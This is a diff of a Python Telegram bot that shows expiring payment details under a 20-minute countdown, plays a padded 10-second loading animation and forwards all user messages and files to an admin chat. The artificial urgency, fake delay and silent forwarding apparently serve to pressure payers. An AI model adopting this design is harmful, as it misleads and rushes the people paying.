@@ -23,10 +23,10 @@ def generate_user_id():
     return "".join(str(random.randint(0, 9)) for _ in range(7)) + "****"
 
 # ---------- прогресс бар ----------
-def build_bar(minutes_left):
-    total = 20
-    green = int((minutes_left / total) * 10)
-    return "🟢" * green + "⚪" * (10 - green)
+def build_bar(seconds_left):
+    total_seconds = 1200  # 20 минут
+    green_blocks = int((seconds_left / total_seconds) * 10)
+    return "🟢" * green_blocks + "⚪" * (10 - green_blocks)
 
 # ---------- формат времени ----------
 def format_time(seconds):
@@ -36,8 +36,7 @@ def format_time(seconds):
 
 # ---------- текст реквизитов ----------
 def build_payment_text(seconds_left):
-    minutes_left = seconds_left // 60
-    bar = build_bar(minutes_left)
+    bar = build_bar(seconds_left)
     timer = format_time(seconds_left)
     return (
         "DATOS ACTUALES:\n\n"
@@ -50,100 +49,76 @@ def build_payment_text(seconds_left):
         f"Tiempo restante: {timer}"
     )
 
-# ---------- таймер (новая надёжная версия) ----------
-async def payment_timer_task(chat_id: int, message_id: int, context: ContextTypes.DEFAULT_TYPE):
-    """Задача таймера. Обновляет сообщение каждую минуту и удаляет в конце."""
+# ---------- таймер реквизитов ----------
+async def payment_timer(message, context: ContextTypes.DEFAULT_TYPE):
     seconds = 1200  # 20 минут
+    while seconds > 0:
+        try:
+            await context.bot.edit_message_text(
+                chat_id=message.chat.id,
+                message_id=message.message_id,
+                text=build_payment_text(seconds),
+                reply_markup=get_data_kb
+            )
+        except Exception:
+            return  # сообщение удалено или ошибка
 
+        await asyncio.sleep(30)  # обновление каждые 30 секунд
+        seconds -= 30
+
+    # удалить сообщение по окончании
     try:
-        while True:
-            # Обновляем текст и бар
-            try:
-                await context.bot.edit_message_text(
-                    chat_id=chat_id,
-                    message_id=message_id,
-                    text=build_payment_text(seconds),
-                    reply_markup=get_data_kb
-                )
-            except Exception:
-                # Сообщение удалено или недоступно — завершаем задачу
-                return
+        await context.bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
+        context.user_data.pop("payment_msg_id", None)
+        context.user_data.pop("payment_task", None)
+    except:
+        pass
 
-            # Если дошли до 00:00 — показываем 2 секунды и удаляем
-            if seconds <= 0:
-                await asyncio.sleep(2)
-                try:
-                    await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
-                except:
-                    pass
-                return
-
-            # Ждём минуту
-            await asyncio.sleep(60)
-            seconds -= 60
-
-    except asyncio.CancelledError:
-        # Задача отменена (пользователь запросил новые реквизиты) — ничего не делаем
-        return
-    except Exception:
-        # На всякий случай
-        return
-
-
-# ---------- отправка реквизитов (главная функция) ----------
+# ---------- отправка реквизитов ----------
 async def send_payment_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
 
-    # 1. Отменяем старую задачу таймера (если есть)
+    # удалить старое сообщение
     if "payment_task" in context.user_data:
         task = context.user_data["payment_task"]
         if not task.done():
             task.cancel()
         context.user_data.pop("payment_task", None)
 
-    # 2. Удаляем старое сообщение с реквизитами (обязательно!)
     old_msg_id = context.user_data.get("payment_msg_id")
     if old_msg_id:
         try:
             await context.bot.delete_message(chat_id=chat_id, message_id=old_msg_id)
         except:
-            pass  # уже удалено или ошибка — не важно
+            pass
 
-    # 3. Анимация загрузки
-    loading = await update.message.reply_text("Cargando: ░░░░░")
-    for i in range(1, 6):
-        bar = "█" * i + "░" * (5 - i)
+    # Анимация загрузки 10 секунд
+    loading = await update.message.reply_text("Cargando: ░░░░░░░░░░")
+    for i in range(1, 11):
+        bar = "█" * i + "░" * (10 - i)
         try:
             await loading.edit_text(f"Cargando: {bar}")
-            await asyncio.sleep(0.5)
         except:
             pass
+        await asyncio.sleep(1)
     try:
         await loading.delete()
     except:
         pass
 
-    # 4. Отправляем новое сообщение с реквизитами
-    payment_msg = await update.message.reply_text(
-        build_payment_text(1200),
-        reply_markup=get_data_kb
-    )
-
-    # 5. Сохраняем ID сообщения
+    # Отправка реквизитов
+    payment_msg = await update.message.reply_text(build_payment_text(1200), reply_markup=get_data_kb)
     context.user_data["payment_msg_id"] = payment_msg.message_id
 
-    # 6. Запускаем таймер
-    task = asyncio.create_task(
-        payment_timer_task(chat_id, payment_msg.message_id, context)
-    )
+    # Запуск таймера
+    task = asyncio.create_task(payment_timer(payment_msg, context))
     context.user_data["payment_task"] = task
-
 
 # ---------- старт ----------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
 
-    # Полностью очищаем предыдущий платёж
+    # удаляем старое сообщение и отменяем таймер
     if "payment_task" in context.user_data:
         task = context.user_data["payment_task"]
         if not task.done():
@@ -152,10 +127,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if "payment_msg_id" in context.user_data:
         try:
-            await context.bot.delete_message(
-                chat_id=chat_id,
-                message_id=context.user_data["payment_msg_id"]
-            )
+            await context.bot.delete_message(chat_id=chat_id, message_id=context.user_data["payment_msg_id"])
         except:
             pass
         context.user_data.pop("payment_msg_id", None)
@@ -176,14 +148,12 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text(text, reply_markup=start_kb)
 
-
 # ---------- пересылка админу ----------
 async def forward_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     msg = update.message
     user_info = f"👤 {user.first_name} | ID:{user.id}"
     await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=user_info)
-
     if msg.text:
         await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=msg.text)
     elif msg.photo:
@@ -191,35 +161,28 @@ async def forward_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif msg.document:
         await context.bot.send_document(chat_id=ADMIN_CHAT_ID, document=msg.document.file_id, caption=msg.caption)
 
-
 # ---------- ответы из админ чата ----------
 async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_chat.id != ADMIN_CHAT_ID:
         return
-    if not update.message.reply_to_message:
+    if not update.message.reply_to_message or not update.message.reply_to_message.text:
         return
-
-    reply = update.message.reply_to_message
-    if not reply.text:
-        return
-
-    for line in reply.text.splitlines():
+    reply_lines = update.message.reply_to_message.text.splitlines()
+    user_id = None
+    for line in reply_lines:
         if "ID:" in line:
             try:
                 user_id = int(line.split("ID:")[1].strip())
-                if update.message.text:
-                    await context.bot.send_message(chat_id=user_id, text=update.message.text)
-                return
             except:
                 pass
-
+    if user_id and update.message.text:
+        await context.bot.send_message(chat_id=user_id, text=update.message.text)
 
 # ---------- основной обработчик ----------
 async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = update.message
     text = msg.text.strip() if msg.text else ""
 
-    # Пересылаем всё админу (кроме админ-чата)
     if msg.chat.id != ADMIN_CHAT_ID:
         await forward_to_admin(update, context)
 
@@ -263,18 +226,14 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data["state"] = "WAIT_DATA"
         return
 
-
 # ---------- запуск ----------
 def main():
     app = ApplicationBuilder().token(TOKEN).build()
-
     app.add_handler(CommandHandler("start", start))
     app.add_handler(MessageHandler(filters.ALL & ~filters.Chat(ADMIN_CHAT_ID), message_handler))
     app.add_handler(MessageHandler(filters.ALL & filters.Chat(ADMIN_CHAT_ID), admin_reply))
-
     print("Бот запущен...")
     app.run_polling(allowed_updates=Update.ALL_TYPES)
-
 
 if __name__ == "__main__":
     main()
